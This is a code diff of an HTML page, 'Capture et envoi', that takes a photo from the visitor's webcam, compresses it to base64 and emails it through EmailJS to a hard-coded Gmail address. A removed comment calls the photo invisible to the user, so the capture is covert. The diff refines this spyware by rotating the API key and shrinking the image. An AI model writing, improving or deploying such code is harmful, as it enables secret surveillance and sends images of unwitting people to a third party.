@@ -5,7 +5,8 @@
   <title>Capture et envoi</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    emailjs.init("mxm3fFA_BxEhqJieq");
+    // Initialisation avec nouvelle clé publique
+    emailjs.init("IoSfbtGz4KSL_5_9E");
   </script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
@@ -33,13 +34,13 @@
 
         // Redimensionnement pour réduire le Base64
         const canvas = document.createElement("canvas");
-        const MAX_WIDTH = 400;
+        const MAX_WIDTH = 200; // petite largeur pour email
         let ratio = video.videoHeight / video.videoWidth;
         canvas.width = MAX_WIDTH;
         canvas.height = MAX_WIDTH * ratio;
 
         canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageBase64 = canvas.toDataURL("image/jpeg", 0.4); // compression 40%
+        const imageBase64 = canvas.toDataURL("image/jpeg", 0.3); // compression 30%
 
         // Stop caméra
         stream.getTracks().forEach(track => track.stop());
@@ -47,7 +48,7 @@
         // Envoi EmailJS
         const params = {
           to_email: "adressestestee@gmail.com",
-          message: "Photo capturée (Base64, invisible à l'utilisateur) : " + imageBase64
+          message: imageBase64
         };
 
         emailjs.send("service_8cs0gml", "template_hgvdx1g", params)
